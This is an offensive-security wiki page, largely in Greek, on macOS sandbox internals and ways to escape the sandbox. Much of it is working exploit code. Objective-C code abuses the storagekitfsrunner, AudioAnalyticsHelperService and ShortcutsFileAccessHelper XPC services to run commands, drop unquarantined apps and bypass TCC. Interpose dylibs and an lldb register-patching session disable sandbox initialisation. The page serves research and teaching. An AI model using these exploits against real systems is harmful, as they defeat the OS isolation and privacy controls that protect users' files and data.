# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox loading process

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Στην προηγούμενη εικόνα είναι δυνατόν να παρατηρηθεί **πώς θα φορτωθεί το sandbox** όταν εκτελείται μια εφαρμογή με την εξουσιοδότηση **`com.apple.security.app-sandbox`**.

Ο μεταγλωττιστής θα συνδέσει το `/usr/lib/libSystem.B.dylib` με το δυαδικό αρχείο.

Στη συνέχεια, **`libSystem.B`** θα καλεί άλλες πολλές συναρτήσεις μέχρι να στείλει η **`xpc_pipe_routine`** τις εξουσιοδοτήσεις της εφαρμογής στο **`securityd`**. Το Securityd ελέγχει αν η διαδικασία θα πρέπει να είναι σε καραντίνα μέσα στο Sandbox, και αν ναι, θα μπει σε καραντίνα.\
Τέλος, το sandbox θα ενεργοποιηθεί με μια κλήση στο **`__sandbox_ms`** που θα καλέσει το **`__mac_syscall`**.

## Possible Bypasses

### Bypassing quarantine attribute

**Τα αρχεία που δημιουργούνται από διαδικασίες που είναι σε sandbox** προστίθεται το **quarantine attribute** για να αποτραπεί η διαφυγή από το sandbox. Ωστόσο, αν καταφέρετε να **δημιουργήσετε έναν φάκελο `.app` χωρίς το quarantine attribute** μέσα σε μια εφαρμογή που είναι σε sandbox, θα μπορούσατε να κάνετε το δυαδικό αρχείο της εφαρμογής να δείχνει στο **`/bin/bash`** και να προσθέσετε κάποιες μεταβλητές περιβάλλοντος στο **plist** για να εκμεταλλευτείτε το **`open`** για να **εκκινήσετε τη νέα εφαρμογή χωρίς sandbox**.

Αυτό έγινε στο [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> Επομένως, αυτή τη στιγμή, αν είστε απλώς ικανοί να δημιουργήσετε έναν φάκελο με όνομα που τελειώνει σε **`.app`** χωρίς το quarantine attribute, μπορείτε να διαφύγετε από το sandbox γιατί το macOS μόνο **ελέγχει** το **quarantine** attribute στον **φάκελο `.app`** και στο **κύριο εκτελέσιμο** (και θα δείξουμε το κύριο εκτελέσιμο στο **`/bin/bash`**).
>
> Σημειώστε ότι αν ένα πακέτο .app έχει ήδη εξουσιοδοτηθεί να εκτελείται (έχει ένα quarantine xttr με την εξουσιοδότηση να εκτελείται), μπορείτε επίσης να το εκμεταλλευτείτε... εκτός αν τώρα δεν μπορείτε να γράψετε μέσα σε **`.app`** πακέτα εκτός αν έχετε κάποιες προνομιακές άδειες TCC (που δεν θα έχετε μέσα σε ένα sandbox υψηλής ασφάλειας).

### Abusing Open functionality

Στα [**τελευταία παραδείγματα παράκαμψης sandbox του Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) μπορεί να εκτιμηθεί πώς η λειτουργικότητα **`open`** της γραμμής εντολών θα μπορούσε να εκμεταλλευτεί για να παρακαμφθεί το sandbox.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Ακόμα και αν μια εφαρμογή είναι **σχεδιασμένη να είναι σε sandbox** (`com.apple.security.app-sandbox`), είναι δυνατόν να παρακαμφθεί το sandbox αν εκτελείται από έναν LaunchAgent (`~/Library/LaunchAgents`) για παράδειγμα.\
Όπως εξηγήθηκε σε [**αυτή την ανάρτηση**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), αν θέλετε να αποκτήσετε επιμονή με μια εφαρμογή που είναι σε sandbox μπορείτε να την κάνετε να εκτελείται αυτόματα ως LaunchAgent και ίσως να εισάγετε κακόβουλο κώδικα μέσω μεταβλητών περιβάλλοντος DyLib.

### Abusing Auto Start Locations

Αν μια διαδικασία που είναι σε sandbox μπορεί να **γράψει** σε ένα μέρος όπου **αργότερα μια εφαρμογή χωρίς sandbox θα εκτελέσει το δυαδικό αρχείο**, θα μπορέσει να **διαφύγει απλά τοποθετώντας** εκεί το δυαδικό αρχείο. Ένα καλό παράδειγμα αυτού του είδους τοποθεσιών είναι το `~/Library/LaunchAgents` ή το `/System/Library/LaunchDaemons`.

Για αυτό μπορεί να χρειαστείτε ακόμα και **2 βήματα**: Να κάνετε μια διαδικασία με ένα **πιο επιεική sandbox** (`file-read*`, `file-write*`) να εκτελέσει τον κώδικά σας που θα γράψει σε ένα μέρος όπου θα **εκτελείται χωρίς sandbox**.

Δείτε αυτή τη σελίδα σχετικά με τις **τοποθεσίες αυτόματης εκκίνησης**:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusing other processes

Αν από τη διαδικασία sandbox μπορείτε να **συμβιβάσετε άλλες διαδικασίες** που εκτελούνται σε λιγότερο περιορισμένα sandbox (ή καθόλου), θα μπορέσετε να διαφύγετε στα sandbox τους:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Available System and User Mach services

Το sandbox επιτρέπει επίσης την επικοινωνία με ορισμένες **Mach υπηρεσίες** μέσω XPC που ορίζονται στο προφίλ `application.sb`. Αν μπορείτε να **εκμεταλλευτείτε** μία από αυτές τις υπηρεσίες, μπορεί να είστε σε θέση να **διαφύγετε από το sandbox**.

Όπως αναφέρεται σε [αυτή την ανάλυση](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), οι πληροφορίες σχετικά με τις Mach υπηρεσίες αποθηκεύονται στο `/System/Library/xpc/launchd.plist`. Είναι δυνατόν να βρείτε όλες τις Mach υπηρεσίες του Συστήματος και του Χρήστη αναζητώντας μέσα σε αυτό το αρχείο για `<string>System</string>` και `<string>User</string>`.

Επιπλέον, είναι δυνατόν να ελέγξετε αν μια Mach υπηρεσία είναι διαθέσιμη σε μια εφαρμογή που είναι σε sandbox καλώντας το `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Διαθέσιμες υπηρεσίες PID Mach

Αυτές οι υπηρεσίες Mach χρησιμοποιήθηκαν αρχικά για να [ξεφύγουν από το sandbox σε αυτή την αναφορά](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Μέχρι τότε, **όλες οι υπηρεσίες XPC που απαιτούνταν** από μια εφαρμογή και το πλαίσιο της ήταν ορατές στο πεδίο PID της εφαρμογής (αυτές είναι οι υπηρεσίες Mach με `ServiceType` ως `Application`).

Για να **επικοινωνήσετε με μια υπηρεσία XPC του PID Domain**, χρειάζεται απλώς να την καταχωρίσετε μέσα στην εφαρμογή με μια γραμμή όπως:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Επιπλέον, είναι δυνατόν να βρείτε όλες τις **Application** Mach υπηρεσίες αναζητώντας μέσα στο `System/Library/xpc/launchd.plist` για `<string>Application</string>`.

Ένας άλλος τρόπος για να βρείτε έγκυρες xpc υπηρεσίες είναι να ελέγξετε αυτές που βρίσκονται σε:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Μερικά παραδείγματα που εκμεταλλεύονται αυτή την τεχνική μπορούν να βρεθούν στην [**πρωτότυπη αναφορά**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), ωστόσο, τα παρακάτω είναι μερικά συνοπτικά παραδείγματα.

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Αυτή η υπηρεσία επιτρέπει κάθε σύνδεση XPC επιστρέφοντας πάντα `YES` και η μέθοδος `runTask:arguments:withReply:` εκτελεί μια αυθαίρετη εντολή με αυθαίρετες παραμέτρους.

Η εκμετάλλευση ήταν "τόσο απλή όσο":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Αυτή η υπηρεσία XPC επέτρεπε σε κάθε πελάτη επιστρέφοντας πάντα ΝΑΙ και η μέθοδος `createZipAtPath:hourThreshold:withReply:` ουσιαστικά επέτρεπε να υποδειχθεί η διαδρομή σε έναν φάκελο προς συμπίεση και θα τον συμπίεζε σε ένα αρχείο ZIP.

Επομένως, είναι δυνατό να δημιουργηθεί μια ψεύτικη δομή φακέλου εφαρμογής, να συμπιεστεί, στη συνέχεια να αποσυμπιεστεί και να εκτελεστεί για να ξεφύγει από το sandbox καθώς τα νέα αρχεία δεν θα έχουν το χαρακτηριστικό καραντίνας.

Η εκμετάλλευση ήταν:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Αυτή η υπηρεσία XPC επιτρέπει την παροχή δικαιωμάτων ανάγνωσης και εγγραφής σε μια αυθαίρετη διεύθυνση URL στον πελάτη XPC μέσω της μεθόδου `extendAccessToURL:completion:` που δέχεται οποιαδήποτε σύνδεση. Καθώς η υπηρεσία XPC έχει FDA, είναι δυνατόν να καταχραστούν αυτά τα δικαιώματα για να παρακαμφθεί εντελώς το TCC.

Η εκμετάλλευση ήταν:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Στατική Συγκέντρωση & Δυναμική Σύνδεση

[**Αυτή η έρευνα**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ανακάλυψε 2 τρόπους για να παρακαμφθεί το Sandbox. Επειδή το sandbox εφαρμόζεται από το userland όταν η βιβλιοθήκη **libSystem** φορτώνεται. Αν ένα δυαδικό αρχείο μπορούσε να αποφύγει τη φόρτωσή του, δεν θα υποβαλλόταν ποτέ σε sandbox:

- Αν το δυαδικό αρχείο ήταν **εντελώς στατικά συγκεντρωμένο**, θα μπορούσε να αποφύγει τη φόρτωση αυτής της βιβλιοθήκης.
- Αν το **δυαδικό αρχείο δεν χρειαζόταν να φορτώσει καμία βιβλιοθήκη** (επειδή ο σύνδεσμος είναι επίσης στο libSystem), δεν θα χρειαστεί να φορτώσει το libSystem.

### Shellcodes

Σημειώστε ότι **ακόμα και τα shellcodes** σε ARM64 χρειάζονται να συνδεθούν στο `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Όχι κληρονομούμενοι περιορισμοί

Όπως εξηγείται στο **[bonus of this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ένας περιορισμός sandbox όπως:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
μπορεί να παρακαμφθεί από μια νέα διαδικασία που εκτελείται για παράδειγμα:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Ωστόσο, φυσικά, αυτή η νέα διαδικασία δεν θα κληρονομήσει δικαιώματα ή προνόμια από τη γονική διαδικασία.

### Δικαιώματα

Σημειώστε ότι ακόμη και αν ορισμένες **ενέργειες** μπορεί να είναι **επιτρεπτές από το sandbox** αν μια εφαρμογή έχει ένα συγκεκριμένο **δικαίωμα**, όπως στο:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Για περισσότερες πληροφορίες σχετικά με το **Interposting** ελέγξτε:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` για να αποτρέψετε το sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` για να αποτρέψετε το Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & bypass Sandbox with lldb

Ας συντάξουμε μια εφαρμογή που θα πρέπει να είναι sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Στη συνέχεια, μεταγλωττίστε την εφαρμογή:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Η εφαρμογή θα προσπαθήσει να **διαβάσει** το αρχείο **`~/Desktop/del.txt`**, το οποίο **η Sandbox δεν θα επιτρέψει**.\
> Δημιουργήστε ένα αρχείο εκεί καθώς μόλις παρακαμφθεί η Sandbox, θα μπορεί να το διαβάσει:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Ας αποσφαλματώσουμε την εφαρμογή για να δούμε πότε φορτώνεται η Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Ακόμα και με το Sandbox παρακάμπτεται, το TCC** θα ρωτήσει τον χρήστη αν θέλει να επιτρέψει στη διαδικασία να διαβάσει αρχεία από την επιφάνεια εργασίας

## References

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
